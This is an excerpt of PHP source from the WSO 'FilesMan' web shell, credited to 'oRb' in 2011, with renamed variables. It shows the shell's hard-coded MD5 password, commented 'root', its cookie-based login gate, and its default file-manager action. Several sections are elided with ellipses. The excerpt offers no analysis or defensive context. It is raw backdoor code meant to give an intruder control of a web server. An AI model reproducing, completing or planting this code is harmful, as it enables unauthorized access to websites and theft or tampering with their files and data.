<?php 
$x5 = "63a9f0ea7bb98050796b649e85481845"; //root 
$x4 = true; 
$x3 = 'UTF-8'; 
$x2 = 'FilesMan'; 
$x1 = md5($_SERVER['HTTP_USER_AGENT']); 
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) { 
    prototype(md5($_SERVER['HTTP_HOST'])."key", $x1); 
} 
...
/* (С) 11.2011 oRb */ 
if(!empty($x5)) { 
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $x5)) 
        prototype(md5($_SERVER['HTTP_HOST']), $x5); 
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $x5)) 
        hardLogin(); 
} 
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) 
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$x4; 
function hardLogin() { 
...
if( empty($_POST['a']) ) 
    if(isset($x2) && function_exists('action' . $x2)) 
        $_POST['a'] = $x2; 
    else 
        $_POST['a'] = 'FilesMan'; 
